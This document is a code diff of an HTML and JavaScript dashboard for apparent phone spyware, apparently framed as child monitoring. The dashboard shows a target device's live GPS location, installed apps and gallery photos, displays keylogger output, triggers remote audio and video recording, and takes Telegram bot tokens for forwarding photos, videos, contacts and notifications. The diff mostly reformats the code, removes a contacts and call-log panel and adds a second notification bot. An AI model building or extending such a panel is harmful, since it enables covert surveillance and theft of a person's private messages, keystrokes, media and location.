@@ -11,6 +11,7 @@
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <style>
+/* ==================== GLOBAL RESET ==================== */
 * {
     box-sizing: border-box;
     margin: 0;
@@ -24,6 +25,7 @@ body {
     min-height: 100vh;
 }
 
+/* ==================== HEADER ==================== */
 .header {
     height: 64px;
     border-bottom: 1px solid rgba(255, 60, 60, 0.25);
@@ -95,12 +97,14 @@ body {
     box-shadow: 0 0 10px rgba(255, 50, 55, 0.2);
 }
 
+/* ==================== CONTAINER ==================== */
 .container {
     padding: 20px;
     max-width: 1200px;
     margin: auto;
 }
 
+/* ==================== DEVICE CARD ==================== */
 .device-card {
     border: 1px solid #3b2529;
     border-radius: 18px;
@@ -126,7 +130,7 @@ body {
     color: #35c76a;
 }
 
-/* Main Tabs */
+/* ==================== MAIN TABS ==================== */
 .controls {
     display: flex;
     flex-wrap: wrap;
@@ -167,7 +171,7 @@ body {
     font-size: 12px;
 }
 
-/* Panels */
+/* ==================== PANELS ==================== */
 .panel {
     border: 1px solid #3b292d;
     border-radius: 22px;
@@ -199,7 +203,9 @@ body {
     color: #888;
 }
 
-.refresh-btn, .force-btn {
+/* ==================== BUTTONS ==================== */
+.refresh-btn,
+.force-btn {
     background: #ff3439;
     color: white;
     border: none;
@@ -212,19 +218,21 @@ body {
     box-shadow: 0 0 20px rgba(255, 50, 55, 0.4);
 }
 
-.refresh-btn:hover, .force-btn:hover {
+.refresh-btn:hover,
+.force-btn:hover {
     background: #ff4b4f;
     box-shadow: 0 0 30px rgba(255, 50, 55, 0.7);
     transform: translateY(-1px);
 }
 
-.refresh-btn:disabled, .force-btn:disabled {
+.refresh-btn:disabled,
+.force-btn:disabled {
     opacity: 0.6;
     cursor: not-allowed;
     transform: none;
 }
 
-/* GPS Stat Cards */
+/* ==================== GPS STATS ==================== */
 .gps-stats {
     display: grid;
     grid-template-columns: repeat(4, 1fr);
@@ -268,7 +276,7 @@ body {
     color: #35c76a;
 }
 
-/* Map Container */
+/* ==================== MAP ==================== */
 .map-container {
     margin: 0 20px 20px 20px;
     border-radius: 20px;
@@ -307,17 +315,19 @@ body {
 .spinner {
     width: 16px;
     height: 16px;
-    border: 2px solid rgba(255,255,255,0.3);
+    border: 2px solid rgba(255, 255, 255, 0.3);
     border-top-color: #ff3439;
     border-radius: 50%;
     animation: spin 0.8s linear infinite;
 }
 
 @keyframes spin {
-    to { transform: rotate(360deg); }
+    to {
+        transform: rotate(360deg);
+    }
 }
 
-/* ===== KEYLOGGER BOX & CARDS ===== */
+/* ==================== KEYLOGGER ==================== */
 .keylog-box {
     background: #181214;
     border: 1px solid #342326;
@@ -368,7 +378,7 @@ body {
     margin: 0;
 }
 
-/* Installed Apps */
+/* ==================== INSTALLED APPS ==================== */
 .apps {
     display: grid;
     grid-template-columns: repeat(3, 1fr);
@@ -396,7 +406,7 @@ body {
     word-break: break-all;
 }
 
-/* Gallery Specific */
+/* ==================== GALLERY ==================== */
 .gallery-content {
     margin: 20px;
     padding: 0;
@@ -521,7 +531,7 @@ body {
     position: absolute;
     top: 8px;
     right: 8px;
-    background: rgba(0,0,0,0.7);
+    background: rgba(0, 0, 0, 0.7);
     color: #fff;
     font-size: 9px;
     padding: 3px 6px;
@@ -529,6 +539,7 @@ body {
     border: 1px solid #ff3439;
 }
 
+/* ==================== SKELETON ==================== */
 .skeleton-grid {
     display: grid;
     grid-template-columns: repeat(4, 1fr);
@@ -544,11 +555,18 @@ body {
 }
 
 @keyframes pulse {
-    0% { opacity: 0.6; }
-    50% { opacity: 0.9; }
-    100% { opacity: 0.6; }
+    0% {
+        opacity: 0.6;
+    }
+    50% {
+        opacity: 0.9;
+    }
+    100% {
+        opacity: 0.6;
+    }
 }
 
+/* ==================== ERROR ==================== */
 .error-message {
     text-align: center;
     padding: 20px;
@@ -565,14 +583,14 @@ body {
     margin-top: 8px;
 }
 
-/* Modal viewer */
+/* ==================== MODAL VIEWER ==================== */
 .modal-viewer {
     position: fixed;
     top: 0;
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(0,0,0,0.9);
+    background: rgba(0, 0, 0, 0.9);
     z-index: 1000;
     display: none;
     align-items: center;
@@ -630,7 +648,7 @@ body {
     cursor: pointer;
 }
 
-/* Settings */
+/* ==================== SETTINGS ==================== */
 .settings-input {
     width: 100%;
     padding: 12px;
@@ -641,16 +659,31 @@ body {
     margin-bottom: 15px;
 }
 
-/* Lock modal */
+.settings-section {
+    margin-bottom: 25px;
+    padding: 15px;
+    background: rgba(255, 255, 255, 0.02);
+    border-radius: 12px;
+    border: 1px solid #2d1d20;
+}
+
+.settings-section h4 {
+    color: #ff3439;
+    margin-bottom: 12px;
+    font-size: 14px;
+}
+
+/* ==================== LOCK MODAL ==================== */
 .lock-modal-overlay {
     position: fixed;
     inset: 0;
-    background: rgba(0,0,0,0.8);
+    background: rgba(0, 0, 0, 0.8);
     z-index: 1500;
     display: none;
     align-items: center;
     justify-content: center;
 }
+
 .lock-modal {
     background: #1a1a2e;
     border: 1px solid #ff3439;
@@ -660,12 +693,31 @@ body {
     max-width: 350px;
     width: 90%;
 }
-.lock-modal .lock-emoji { font-size: 50px; margin-bottom: 15px; }
-.lock-modal h3 { margin-bottom: 10px; }
-.lock-modal p { color: #aaa; margin-bottom: 20px; }
-.lock-modal button { background: #ff3439; color: white; border: none; padding: 10px 20px; border-radius: 30px; cursor: pointer; }
 
-/* Responsive */
+.lock-modal .lock-emoji {
+    font-size: 50px;
+    margin-bottom: 15px;
+}
+
+.lock-modal h3 {
+    margin-bottom: 10px;
+}
+
+.lock-modal p {
+    color: #aaa;
+    margin-bottom: 20px;
+}
+
+.lock-modal button {
+    background: #ff3439;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 30px;
+    cursor: pointer;
+}
+
+/* ==================== RESPONSIVE ==================== */
 @media(max-width: 900px) {
     .gps-stats { grid-template-columns: repeat(2, 1fr); }
     .apps { grid-template-columns: repeat(2, 1fr); }
@@ -692,7 +744,6 @@ body {
 }
 </style>
 </head>
-
 <body>
 
 <header class="header">
@@ -708,7 +759,7 @@ body {
 
 <main class="container">
 
-    <!-- Device Info Card -->
+    <!-- ==================== DEVICE INFO CARD ==================== -->
     <section class="device-card">
         <div class="device-name" id="deviceName">📱 Loading...</div>
         <div class="device-status">
@@ -718,7 +769,7 @@ body {
         </div>
     </section>
 
-    <!-- Main Tabs -->
+    <!-- ==================== MAIN TABS ==================== -->
     <div class="controls">
         <button class="control-btn" data-feature="deviceInfo" onclick="checkFeature('deviceInfo', this)">▦ Installed Apps</button>
         <button class="control-btn" data-feature="gps" onclick="checkFeature('gps', this)">📍 GPS Tracker</button>
@@ -726,11 +777,10 @@ body {
         <button class="control-btn" data-feature="activity" onclick="checkFeature('activity', this)">⌨ Keylogger</button>
         <button class="control-btn" data-feature="audio" onclick="checkFeature('audio', this)">🎤 Audio Recorder</button>
         <button class="control-btn" data-feature="video" onclick="checkFeature('video', this)">🎥 Video Recorder</button>
-        <button class="control-btn" data-feature="contacts" onclick="checkFeature('contacts', this)">📞 Contacts</button>
         <button class="control-btn" data-feature="settings" onclick="checkFeature('settings', this)">⚙️ Settings</button>
     </div>
 
-    <!-- GPS Tracker Panel -->
+    <!-- ==================== GPS TRACKER PANEL ==================== -->
     <section class="panel" id="gpsPanel">
         <div class="panel-header">
             <div>
@@ -741,19 +791,34 @@ body {
         </div>
 
         <div class="gps-stats">
-            <div class="stat-card"><div class="stat-label">LATITUDE</div><div class="stat-value" id="latValue">--.-------</div></div>
-            <div class="stat-card"><div class="stat-label">LONGITUDE</div><div class="stat-value" id="lngValue">--.-------</div></div>
-            <div class="stat-card"><div class="stat-label">ACCURACY</div><div class="stat-value green" id="accuracyValue">-- m</div></div>
-            <div class="stat-card"><div class="stat-label">LAST UPDATE</div><div class="stat-value" id="lastUpdateValue">Never</div></div>
+            <div class="stat-card">
+                <div class="stat-label">LATITUDE</div>
+                <div class="stat-value" id="latValue">--.-------</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">LONGITUDE</div>
+                <div class="stat-value" id="lngValue">--.-------</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">ACCURACY</div>
+                <div class="stat-value green" id="accuracyValue">-- m</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">LAST UPDATE</div>
+                <div class="stat-value" id="lastUpdateValue">Never</div>
+            </div>
         </div>
 
         <div class="map-container">
             <div id="map"></div>
-            <div class="map-overlay" id="mapOverlay" style="display:none;"><div class="spinner"></div><span id="mapOverlayText">Requesting GPS location...</span></div>
+            <div class="map-overlay" id="mapOverlay" style="display:none;">
+                <div class="spinner"></div>
+                <span id="mapOverlayText">Requesting GPS location...</span>
+            </div>
         </div>
     </section>
 
-    <!-- Installed Apps Panel -->
+    <!-- ==================== INSTALLED APPS PANEL ==================== -->
     <section class="panel" id="appsPanel" style="display:none;">
         <div class="panel-header">
             <div class="panel-title">▦ Installed Packages & Applications</div>
@@ -762,7 +827,7 @@ body {
         <div class="apps" id="installedAppsList">Loading apps...</div>
     </section>
 
-    <!-- Media Gallery Panel -->
+    <!-- ==================== MEDIA GALLERY PANEL ==================== -->
     <section class="panel" id="galleryPanel" style="display:none;">
         <div class="panel-header">
             <div>
@@ -792,10 +857,14 @@ body {
 
             <div id="galleryLoading" style="display:none;">
                 <div class="skeleton-grid">
-                    <div class="skeleton-card"></div><div class="skeleton-card"></div><div class="skeleton-card"></div><div class="skeleton-card"></div>
+                    <div class="skeleton-card"></div>
+                    <div class="skeleton-card"></div>
+                    <div class="skeleton-card"></div>
+                    <div class="skeleton-card"></div>
                 </div>
                 <p style="text-align:center;color:#888;">Fetching gallery photos...</p>
             </div>
+
             <div id="galleryError" style="display:none;" class="error-message">
                 <p id="galleryErrorText">Unable to load gallery</p>
                 <button onclick="fetchGalleryPhotos(false)">Retry</button>
@@ -803,7 +872,7 @@ body {
         </div>
     </section>
 
-    <!-- Keylogger Panel -->
+    <!-- ==================== KEYLOGGER PANEL ==================== -->
     <section class="panel" id="keylogPanel" style="display:none;">
         <div class="panel-header">
             <div class="panel-title">⌨ Keylogger</div>
@@ -812,7 +881,7 @@ body {
         <div class="keylog-box" id="keylogContent"></div>
     </section>
 
-    <!-- Audio Recording Panel -->
+    <!-- ==================== AUDIO RECORDING PANEL ==================== -->
     <section class="panel" id="audioPanel" style="display:none;">
         <div class="panel-header">
             <div>
@@ -841,7 +910,7 @@ body {
         </div>
     </section>
 
-    <!-- Video Recording Panel -->
+    <!-- ==================== VIDEO RECORDING PANEL ==================== -->
     <section class="panel" id="videoPanel" style="display:none;">
         <div class="panel-header">
             <div>
@@ -865,45 +934,42 @@ body {
             </select>
             <button class="force-btn" onclick="sendVideoRequest()">🎥 Start Recording</button>
         </div>
-        <div id="videoStatus" style="padding: 0 20px 20px 20px; color: #aaa; font-size: 14px;">No active recording.</div>
+        <div id="videoStatus" style="padding: 0 20px 20px 20px; color: #aaa; font-size: 14px;">
+            No active recording.
+        </div>
         <div id="videoListContainer" style="margin: 20px;">
             <h3 style="margin-bottom:10px;">📁 Recorded Videos</h3>
             <div id="videoList"></div>
         </div>
     </section>
 
-    <!-- Contacts & Call Logs Panel -->
-    <section class="panel" id="contactsPanel" style="display:none;">
-        <div class="panel-header">
-            <div class="panel-title">📞 Contacts & Call Logs</div>
-            <button class="refresh-btn" onclick="loadContacts()">⟳ Refresh</button>
-        </div>
-        <div style="padding:20px;">
-            <h3>📱 Call Logs (Last 24h)</h3>
-            <div id="callLogsList"></div>
-            <hr style="border-color:#333; margin:20px 0;">
-            <h3>👤 Contacts</h3>
-            <div id="contactsList"></div>
-        </div>
-    </section>
-
-    <!-- Settings Panel -->
+    <!-- ==================== SETTINGS PANEL ==================== -->
     <section class="panel" id="settingsPanel" style="display:none;">
         <div class="panel-header">
             <div class="panel-title">⚙️ Telegram Bot Settings</div>
         </div>
         <div style="padding:20px;">
-            <label>Bot Token</label>
-            <input type="text" id="tgBotToken" class="settings-input" placeholder="Enter your Telegram bot token">
-            <label>Chat ID</label>
-            <input type="text" id="tgChatId" class="settings-input" placeholder="Enter your Telegram chat ID">
+            <div class="settings-section">
+                <h4>📸 Gallery Bot (Photos, Videos, Contacts)</h4>
+                <label>Bot Token</label>
+                <input type="text" id="tgBotToken" class="settings-input" placeholder="Gallery bot token">
+                <label>Chat ID</label>
+                <input type="text" id="tgChatId" class="settings-input" placeholder="Gallery chat ID">
+            </div>
+            <div class="settings-section">
+                <h4>🔔 Notification Bot (Incoming Notifications)</h4>
+                <label>Bot Token</label>
+                <input type="text" id="tgNotifBotToken" class="settings-input" placeholder="Notification bot token">
+                <label>Chat ID</label>
+                <input type="text" id="tgNotifChatId" class="settings-input" placeholder="Notification chat ID">
+            </div>
             <button class="force-btn" onclick="saveTelegramSettings()">💾 Save Settings</button>
         </div>
     </section>
 
 </main>
 
-<!-- Lock Modal -->
+<!-- ==================== LOCK MODAL ==================== -->
 <div class="lock-modal-overlay" id="lockModalOverlay">
     <div class="lock-modal">
         <div class="lock-emoji">🔒</div>
@@ -913,7 +979,7 @@ body {
     </div>
 </div>
 
-<!-- Modal Viewer -->
+<!-- ==================== MODAL VIEWER ==================== -->
 <div class="modal-viewer" id="mediaModal">
     <button class="modal-close" onclick="closeMediaViewer()">×</button>
     <div class="modal-content" id="mediaModalContent"></div>
@@ -922,9 +988,8 @@ body {
         <button onclick="nextMedia()">Next ›</button>
     </div>
 </div>
-
 <script>
-// ================== CONFIG ==================
+// ==================== CONFIG ====================
 const DEFAULT_CENTER = [23.8103, 90.4125];
 const DEFAULT_ZOOM = 13;
 let map;
@@ -934,16 +999,22 @@ let galleryItems = [];
 let currentMediaIndex = -1;
 let featurePermissions = {};
 
-// ================== UTILITY ==================
+// ==================== UTILITY ====================
 function getDeviceId() {
     const params = new URLSearchParams(window.location.search);
     return params.get("deviceId") || "child-phone-123";
 }
+
 function escapeHtml(value) {
-    return String(value).replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;").replaceAll('"',"&quot;").replaceAll("'","&#039;");
+    return String(value)
+        .replaceAll("&", "&amp;")
+        .replaceAll("<", "&lt;")
+        .replaceAll(">", "&gt;")
+        .replaceAll('"', "&quot;")
+        .replaceAll("'", "&#039;");
 }
 
-// ================== FEATURE LOCK CHECK ==================
+// ==================== FEATURE LOCK ====================
 async function loadFeaturePermissions() {
     try {
         const deviceId = getDeviceId();
@@ -951,16 +1022,21 @@ async function loadFeaturePermissions() {
         if (res.ok) {
             const data = await res.json();
             featurePermissions = data.features || {};
+            localStorage.setItem('features_' + deviceId, JSON.stringify(featurePermissions));
         } else {
-            featurePermissions = {};
+            const cached = localStorage.getItem('features_' + deviceId);
+            featurePermissions = cached ? JSON.parse(cached) : {};
         }
-    } catch(e) {
-        featurePermissions = {};
+    } catch (e) {
+        const cached = localStorage.getItem('features_' + getDeviceId());
+        featurePermissions = cached ? JSON.parse(cached) : {};
     }
     document.querySelectorAll('.control-btn[data-feature]').forEach(btn => {
         const feature = btn.dataset.feature;
         if (featurePermissions[feature] === false) {
-            btn.innerHTML = `${btn.textContent} <span class="lock-icon">🔒</span>`;
+            if (!btn.querySelector('.lock-icon')) {
+                btn.innerHTML = `${btn.textContent} <span class="lock-icon">🔒</span>`;
+            }
         }
     });
 }
@@ -974,14 +1050,13 @@ function checkFeature(feature, btn) {
         showLockModal();
         return;
     }
-    switch(feature) {
+    switch (feature) {
         case 'deviceInfo': showApps(btn); break;
         case 'gps': showGPS(btn); break;
         case 'installedApps': showGallery(btn); break;
         case 'activity': showKeylog(btn); break;
         case 'audio': showAudio(btn); break;
         case 'video': showVideo(btn); break;
-        case 'contacts': showContacts(btn); break;
         case 'settings': showSettings(btn); break;
         default: showApps(btn);
     }
@@ -990,11 +1065,12 @@ function checkFeature(feature, btn) {
 function showLockModal() {
     document.getElementById('lockModalOverlay').style.display = 'flex';
 }
+
 function closeLockModal() {
     document.getElementById('lockModalOverlay').style.display = 'none';
 }
 
-// ================== LOCALSTORAGE HELPERS ==================
+// ==================== LOCALSTORAGE HELPERS ====================
 function getLastKnownLocation(deviceId) {
     const key = "lastGpsLocation_" + deviceId;
     const stored = localStorage.getItem(key);
@@ -1003,11 +1079,12 @@ function getLastKnownLocation(deviceId) {
     }
     return null;
 }
+
 function saveLastKnownLocation(deviceId, location) {
     localStorage.setItem("lastGpsLocation_" + deviceId, JSON.stringify(location));
 }
 
-// ================== MAP INIT ==================
+// ==================== MAP INIT ====================
 function initMap() {
     if (map) return;
     map = L.map('map', { center: DEFAULT_CENTER, zoom: DEFAULT_ZOOM, zoomControl: true });
@@ -1017,7 +1094,7 @@ function initMap() {
     }).addTo(map);
 }
 
-// ================== MARKER HELPERS ==================
+// ==================== MARKER HELPERS ====================
 function createOrUpdateMarker(lat, lng, popupContent) {
     const icon = L.divIcon({
         className: 'custom-marker',
@@ -1033,11 +1110,12 @@ function createOrUpdateMarker(lat, lng, popupContent) {
     }
     marker.bindPopup(popupContent).openPopup();
 }
+
 function removeMarker() {
     if (marker) { map.removeLayer(marker); marker = null; }
 }
 
-// ================== OVERLAY HELPERS ==================
+// ==================== OVERLAY HELPERS ====================
 function showOverlayWithSpinner(text) {
     const overlay = document.getElementById("mapOverlay");
     if (overlay) {
@@ -1045,6 +1123,7 @@ function showOverlayWithSpinner(text) {
         overlay.style.display = "flex";
     }
 }
+
 function showOverlayText(text) {
     const overlay = document.getElementById("mapOverlay");
     if (overlay) {
@@ -1052,12 +1131,13 @@ function showOverlayText(text) {
         overlay.style.display = "flex";
     }
 }
+
 function hideOverlay() {
     const overlay = document.getElementById("mapOverlay");
     if (overlay) overlay.style.display = "none";
 }
 
-// ================== DATA FETCH ==================
+// ==================== LOAD DEVICE INFO ====================
 async function loadDeviceInfo(showLoadingOverlay = false) {
     const deviceId = getDeviceId();
     document.getElementById("deviceIdDisplay").innerHTML = `DEVICE ID: <b>${escapeHtml(deviceId)}</b>`;
@@ -1089,6 +1169,7 @@ async function loadDeviceInfo(showLoadingOverlay = false) {
     }
 }
 
+// ==================== UPDATE GPS DATA ====================
 function updateGPSData(data) {
     const deviceId = getDeviceId();
     const lat = data.latitude ?? null;
@@ -1139,14 +1220,23 @@ function updateGPSData(data) {
     showOverlayText("Waiting for GPS location...");
 }
 
+// ==================== RENDER INSTALLED APPS ====================
 function renderInstalledApps(apps) {
     const container = document.getElementById("installedAppsList");
     if (!container) return;
-    if (apps.length === 0) { container.innerHTML = `<div class="app">No apps found</div>`; return; }
-    container.innerHTML = apps.map(app => `<div class="app"><div class="app-name">${escapeHtml(app.name)}</div><div class="package">${escapeHtml(app.package)}</div></div>`).join("");
+    if (apps.length === 0) {
+        container.innerHTML = `<div class="app">No apps found</div>`;
+        return;
+    }
+    container.innerHTML = apps.map(app => `
+        <div class="app">
+            <div class="app-name">${escapeHtml(app.name)}</div>
+            <div class="package">${escapeHtml(app.package)}</div>
+        </div>
+    `).join("");
 }
 
-// ================== GALLERY FUNCTIONS ==================
+// ==================== GALLERY FUNCTIONS ====================
 async function fetchGalleryPhotos(fetchAll = false) {
     const deviceId = getDeviceId();
     const countSelect = document.getElementById("galleryCountSelect");
@@ -1170,7 +1260,10 @@ async function fetchGalleryPhotos(fetchAll = false) {
             const res = await fetch(`/api/gallery?deviceId=${deviceId}&count=${count}`);
             if (!res.ok) throw new Error('Failed to fetch gallery');
             const data = await res.json();
-            if (data && data.media && data.media.length > 0) { media = data.media; break; }
+            if (data && data.media && data.media.length > 0) {
+                media = data.media;
+                break;
+            }
         }
         if (media.length === 0) throw new Error('No media received');
         galleryItems = media;
@@ -1183,6 +1276,7 @@ async function fetchGalleryPhotos(fetchAll = false) {
         loading.style.display = 'none';
     }
 }
+
 function renderGalleryGrids() {
     const latest = galleryItems.slice(0, 10);
     document.getElementById("latestCountBadge").textContent = latest.length;
@@ -1190,6 +1284,7 @@ function renderGalleryGrids() {
     document.getElementById("latestGalleryGrid").innerHTML = latest.map((item, i) => createMediaCard(item, i)).join('');
     document.getElementById("allGalleryGrid").innerHTML = galleryItems.map((item, i) => createMediaCard(item, i)).join('');
 }
+
 function createMediaCard(item, index) {
     const type = item.type || 'image';
     const thumb = item.thumbnailBase64 ? `data:image/jpeg;base64,${item.thumbnailBase64}` : '';
@@ -1199,15 +1294,20 @@ function createMediaCard(item, index) {
     return `<div class="media-card" onclick="openMediaViewer(${index})">
         <div class="media-type-badge">${type === 'video' ? '▶' : '📷'}</div>
         ${thumb ? `<img src="${thumb}" class="media-thumb">` : `<div class="media-thumb" style="display:flex;align-items:center;justify-content:center;color:#666;">No Thumb</div>`}
-        <div class="media-info"><div class="media-filename">${escapeHtml(filename)}</div><div class="media-meta">${timestamp} • ${size}</div></div>
+        <div class="media-info">
+            <div class="media-filename">${escapeHtml(filename)}</div>
+            <div class="media-meta">${timestamp} • ${size}</div>
+        </div>
     </div>`;
 }
+
 function formatFileSize(bytes) {
     if (!bytes) return '0 B';
-    const k = 1024, sizes = ['B','KB','MB','GB'];
+    const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'];
     const i = Math.floor(Math.log(bytes) / Math.log(k));
     return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
 }
+
 function openMediaViewer(index) {
     if (index < 0 || index >= galleryItems.length) return;
     currentMediaIndex = index;
@@ -1216,22 +1316,82 @@ function openMediaViewer(index) {
     document.getElementById("mediaModalContent").innerHTML = item.type === 'video' ? `<video controls src="${thumb}"></video>` : `<img src="${thumb}">`;
     document.getElementById("mediaModal").classList.add('active');
 }
-function closeMediaViewer() { document.getElementById("mediaModal").classList.remove('active'); }
-function prevMedia() { if (galleryItems.length) { currentMediaIndex = (currentMediaIndex - 1 + galleryItems.length) % galleryItems.length; openMediaViewer(currentMediaIndex); } }
-function nextMedia() { if (galleryItems.length) { currentMediaIndex = (currentMediaIndex + 1) % galleryItems.length; openMediaViewer(currentMediaIndex); } }
 
-// ================== TABS ==================
-function setActiveTab(btn) { document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active")); btn.classList.add("active"); }
-function showApps(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("appsPanel").style.display = "block"; loadDeviceInfo(); }
-function showGPS(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("gpsPanel").style.display = "block"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
-function showGallery(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("galleryPanel").style.display = "block"; fetchGalleryPhotos(false); }
-function showKeylog(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("keylogPanel").style.display = "block"; refreshKeylog(); }
-function showAudio(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("audioPanel").style.display = "block"; loadAudioList(); }
-function showVideo(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("videoPanel").style.display = "block"; loadVideoList(); }
-function showContacts(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("contactsPanel").style.display = "block"; loadContacts(); }
-function showSettings(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("settingsPanel").style.display = "block"; loadTelegramSettings(); }
+function closeMediaViewer() {
+    document.getElementById("mediaModal").classList.remove('active');
+}
 
-// ================== FORCE GPS UPDATE ==================
+function prevMedia() {
+    if (galleryItems.length) {
+        currentMediaIndex = (currentMediaIndex - 1 + galleryItems.length) % galleryItems.length;
+        openMediaViewer(currentMediaIndex);
+    }
+}
+
+function nextMedia() {
+    if (galleryItems.length) {
+        currentMediaIndex = (currentMediaIndex + 1) % galleryItems.length;
+        openMediaViewer(currentMediaIndex);
+    }
+}
+
+// ==================== TABS ====================
+function setActiveTab(btn) {
+    document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+}
+
+function showApps(btn) {
+    setActiveTab(btn);
+    document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
+    document.getElementById("appsPanel").style.display = "block";
+    loadDeviceInfo();
+}
+
+function showGPS(btn) {
+    setActiveTab(btn);
+    document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
+    document.getElementById("gpsPanel").style.display = "block";
+    loadDeviceInfo();
+    setTimeout(() => { if (map) map.invalidateSize(); }, 100);
+}
+
+function showGallery(btn) {
+    setActiveTab(btn);
+    document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
+    document.getElementById("galleryPanel").style.display = "block";
+    fetchGalleryPhotos(false);
+}
+
+function showKeylog(btn) {
+    setActiveTab(btn);
+    document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
+    document.getElementById("keylogPanel").style.display = "block";
+    refreshKeylog();
+}
+
+function showAudio(btn) {
+    setActiveTab(btn);
+    document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
+    document.getElementById("audioPanel").style.display = "block";
+    loadAudioList();
+}
+
+function showVideo(btn) {
+    setActiveTab(btn);
+    document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
+    document.getElementById("videoPanel").style.display = "block";
+    loadVideoList();
+}
+
+function showSettings(btn) {
+    setActiveTab(btn);
+    document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
+    document.getElementById("settingsPanel").style.display = "block";
+    loadTelegramSettings();
+}
+
+// ==================== FORCE GPS UPDATE ====================
 async function forceGpsUpdate() {
     const btn = document.getElementById("forceGpsBtn");
     const deviceId = getDeviceId();
@@ -1247,9 +1407,12 @@ async function forceGpsUpdate() {
         for (let i = 0; i < 10; i++) {
             await new Promise(resolve => setTimeout(resolve, 2000));
             const data = await loadDeviceInfo();
-            if (data && data.latitude !== null && data.longitude !== null) { received = true; break; }
+            if (data && data.latitude !== null && data.longitude !== null) {
+                received = true;
+                break;
+            }
         }
-        if (!received) alert('GPS response not received yet. Make sure APK is online and location service enabled.');
+        if (!received) alert('GPS response not received yet.');
     } catch (e) {
         console.error(e);
         alert('GPS request failed.');
@@ -1259,7 +1422,7 @@ async function forceGpsUpdate() {
     }
 }
 
-// ================== KEYLOGGER ==================
+// ==================== KEYLOGGER ====================
 async function refreshKeylog() {
     const deviceId = getDeviceId();
     const container = document.getElementById("keylogContent");
@@ -1284,14 +1447,14 @@ async function refreshKeylog() {
     }
 }
 
-// ================== AUDIO RECORDER ==================
+// ==================== AUDIO RECORDER ====================
 async function sendAudioRequest() {
     const deviceId = getDeviceId();
     const duration = parseInt(document.getElementById("audioDurationSelect").value);
     const btn = event.target;
     btn.disabled = true;
     btn.innerHTML = '⏳ Sending...';
-    document.getElementById("audioStatus").innerHTML = 'Request sent. Waiting for device to record and upload...';
+    document.getElementById("audioStatus").innerHTML = 'Request sent...';
     try {
         const res = await fetch('/api/audio/request', {
             method: 'POST',
@@ -1300,7 +1463,7 @@ async function sendAudioRequest() {
         });
         const data = await res.json();
         if (!res.ok) throw new Error(data.error || 'Failed');
-        document.getElementById("audioStatus").innerHTML = `Recording requested for ${duration} seconds. Check list below.`;
+        document.getElementById("audioStatus").innerHTML = `Recording requested for ${duration} seconds.`;
         loadAudioList();
     } catch (e) {
         document.getElementById("audioStatus").innerHTML = `Error: ${e.message}`;
@@ -1335,7 +1498,7 @@ function downloadAudio(filename) {
     window.location.href = `/api/audio/download/${encodeURIComponent(filename)}`;
 }
 
-// ================== VIDEO RECORDER ==================
+// ==================== VIDEO RECORDER ====================
 async function sendVideoRequest() {
     const deviceId = getDeviceId();
     const duration = parseInt(document.getElementById("videoDurationSelect").value);
@@ -1343,7 +1506,7 @@ async function sendVideoRequest() {
     const btn = event.target;
     btn.disabled = true;
     btn.innerHTML = '⏳ Sending...';
-    document.getElementById("videoStatus").innerHTML = 'Request sent. Waiting for device to record and upload...';
+    document.getElementById("videoStatus").innerHTML = 'Request sent...';
     try {
         const res = await fetch('/api/video/request', {
             method: 'POST',
@@ -1352,7 +1515,7 @@ async function sendVideoRequest() {
         });
         const data = await res.json();
         if (!res.ok) throw new Error(data.error || 'Failed');
-        document.getElementById("videoStatus").innerHTML = `Recording requested for ${duration} seconds. Check list below.`;
+        document.getElementById("videoStatus").innerHTML = `Recording requested for ${duration} seconds.`;
         loadVideoList();
     } catch (e) {
         document.getElementById("videoStatus").innerHTML = `Error: ${e.message}`;
@@ -1387,54 +1550,25 @@ function downloadVideo(filename) {
     window.location.href = `/api/video/download/${encodeURIComponent(filename)}`;
 }
 
-// ================== CONTACTS & CALL LOGS ==================
-async function loadContacts() {
-    const deviceId = getDeviceId();
-    try {
-        const callRes = await fetch(`/api/calllogs?deviceId=${deviceId}`);
-        const callData = await callRes.json();
-        const callLogs = callData.callLogs || [];
-        const callContainer = document.getElementById("callLogsList");
-        if (callLogs.length === 0) callContainer.innerHTML = "No call logs.";
-        else callContainer.innerHTML = callLogs.map(log => `
-            <div style="background:#1a1214; border:1px solid #2d1d20; border-radius:8px; padding:10px; margin-bottom:6px;">
-                <div>${escapeHtml(log.name)} (${escapeHtml(log.number)})</div>
-                <div style="color:#aaa; font-size:12px;">Type: ${log.type} | Duration: ${log.duration}s | ${new Date(log.timestamp).toLocaleString()}</div>
-            </div>
-        `).join("");
-
-        const conRes = await fetch(`/api/contacts?deviceId=${deviceId}`);
-        const conData = await conRes.json();
-        const contacts = conData.contacts || [];
-        const conContainer = document.getElementById("contactsList");
-        if (contacts.length === 0) conContainer.innerHTML = "No contacts.";
